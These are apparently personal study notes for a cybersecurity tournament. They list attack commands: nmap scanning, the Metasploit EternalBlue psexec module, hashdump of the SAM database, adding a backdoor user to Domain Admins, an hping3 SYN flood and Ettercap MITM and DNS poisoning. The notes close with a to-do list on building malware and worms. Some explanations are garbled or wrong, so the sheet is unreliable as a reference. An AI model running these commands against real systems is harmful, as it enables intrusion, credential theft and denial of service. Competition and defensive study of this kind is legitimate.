# DISCOVER THE IP ADDRESS OF THE SERVER THAT YOU ARE ATTACKING 

-> RUN NETDISCOVER AND THEN BUILD THE COMMAND TO SCAN YOUR NETWORK `netdiscover -i eth0`

1. You do this scan when you are inside the building Active Directory - This is done when you are inside the entire network

`nmap -sS -sV -A 10.1.10.2` -> Stealth Scan, service Version, A=Operating System


2. Social Engineering -> Is the easiest way to gather information

3. Use Metasploit and Google the OS

`use exploit/windows/smb/ms17_010_psexec` : Google the types of windows server2012 then it will work. Research the OS and find out how to get them to work

3. `exploit` or `shell`

4. Type `shell`to get the code to successfully compile and run

# PRIVILEGE ESCALATION : LEARN HOW TO USE THE `net` command  and other methods of Privilege Escalation

1.  `hashdump` : To show all the contents of the SAM DB to develop and improve the application

2. `screenshare` : To share

3. `shell` : to get access to the windows system

4. `net user` : Get a list of all the users registered onto the system

5. `net user tino admin@123! /add` : Add a new user into the windows system and remember that only admin users can log into the server

6. `net user ` : You will be able to see the changes that are to be made

7. `net group` : This will show you all the listed local groups

8. `net user Administrator` : Have a look at all the administrator groups

9. `net group "Domain Admins" tino /add` : Add the user into the domain

10. Create groups once you are 

**NB** Switch to a higher smb version & Perhaps change the port number to a different account and it is only recommended if it is not having a large impact on the system

# HACK INTO A WEB SERVER : `Evil Limiter`

# HACK INTO A WINDOWS 7 BUT USE A DIFFERENT PRIVILEGE ESCALATION METHOD

## HPING3

1. `hping3 -p port_number` : Bringing a specific port down

2. `hping3 -S -P -U --flood -V --rand-source target_ip` : Attack with random ip addresses

3. `hping3 `

## ETTERCAP -G :  MITM, DNS POISONING, SNIFFING

1. `Ettercap -G` : Start, Select the eth0, Click the 


## BEST WAYS TO DEFEND THE SYSTEM

1. WHITELIST ON WINDOWS

2. SETUP FIREWALL RULES

3. CHANGE THE IP ADDRESSES FOR SPECIFIC PORTS

4. AZUL SIEM - WAZUH SETUP : TO PREVENT AND WATCH THE SYSTEM

5. CHANGE DEFAULT NAMES

--------------------------------------------------------------------------------------------

# TOURNAMENT PREPARATION

1. Servers running on the System ✅ 

2. How to configure the services running on the server, 
	FTP, 
	WEB SERVER, ✅ 
	EMAIL SERVER, 

3. How to change the port numbers ✅ 

4. Throttling, Setup a firewall for the FTP and Web Server to configure

5. How to setup access for specific services on the servers

6. Prevent Banner Grabbing & File Leakages

7. 

----------------------------------------------------------------------------------------
1. How to build malware 

2. How to build a worm 

3. How to build a network scanner

4. How to encrypt files





























